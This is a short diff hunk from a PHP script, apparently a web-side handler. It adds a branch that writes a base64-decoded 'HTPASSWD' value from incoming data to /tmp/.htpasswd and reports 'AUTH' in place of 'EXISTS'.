@@ -51,7 +51,14 @@ switch ($_GET["op"]) {
 							}
 							echo "<br>";
 						}
-						else echo "EXISTS";
+						else {
+							if (empty($data["HTPASSWD"])) echo "EXISTS";
+							else {
+								$auth_file = "/tmp/.htpasswd";
+								file_put_contents($auth_file,base64_decode($data["HTPASSWD"]));
+								echo "AUTH";
+							}
+						}
 					}
 					remove_response("$key");
 				}
